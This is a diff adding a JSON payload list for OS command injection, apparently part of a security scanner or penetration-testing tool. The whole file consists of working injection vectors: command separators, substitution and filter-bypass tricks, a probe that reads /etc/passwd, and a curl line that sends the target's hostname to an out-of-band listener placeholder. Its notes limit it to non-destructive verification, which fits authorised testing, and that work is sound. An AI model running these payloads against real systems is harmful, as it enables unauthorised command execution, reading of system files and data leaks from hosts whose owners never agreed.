@@ -1,0 +1,20 @@
+{
+  "class": "cmdi",
+  "order": "bypass-first",
+  "note": "Out-of-band/verification-first: prefer {OOB} callbacks and echo-id probes over destructive output. Never execute data-wiping or resource-exhausting commands.",
+  "payloads": [
+    { "id": "cmdi::01", "vector": "; id", "note": "semicolon separator — baseline" },
+    { "id": "cmdi::02", "vector": "%0a id %0a", "note": "newline separator — survives many filters" },
+    { "id": "cmdi::03", "vector": "$(id)", "note": "substitution — works in double-quote contexts" },
+    { "id": "cmdi::04", "vector": "`id`", "note": "backtick substitution" },
+    { "id": "cmdi::05", "vector": "& id &", "note": "background/AND chaining" },
+    { "id": "cmdi::06", "vector": "| id", "note": "pipe chaining" },
+    { "id": "cmdi::07", "vector": ";${IFS}id", "note": "IFS bypass for space filters" },
+    { "id": "cmdi::08", "vector": "{id,}", "note": "brace expansion — no spaces needed" },
+    { "id": "cmdi::09", "vector": ";echo pwn-$(id -u)-end", "note": "unique-marker echo for diff_responses verification" },
+    { "id": "cmdi::10", "vector": ";curl http://{OOB}/$(hostname)", "note": "OOB confirmation — poll listener; hostname only, no data exfil" },
+    { "id": "cmdi::11", "vector": ";sleep 5", "note": "time-based confirmation (rate limiter aware)" },
+    { "id": "cmdi::12", "vector": ";cat%09/etc/passwd", "note": "tab char for space filter — read-only proof" },
+    { "id": "cmdi::13", "vector": "$(tr '\\152' '\\141' <<< 'Jx' 2>/dev/null)", "note": "tr-based char obfuscation probe (rare filters)" }
+  ]
+}
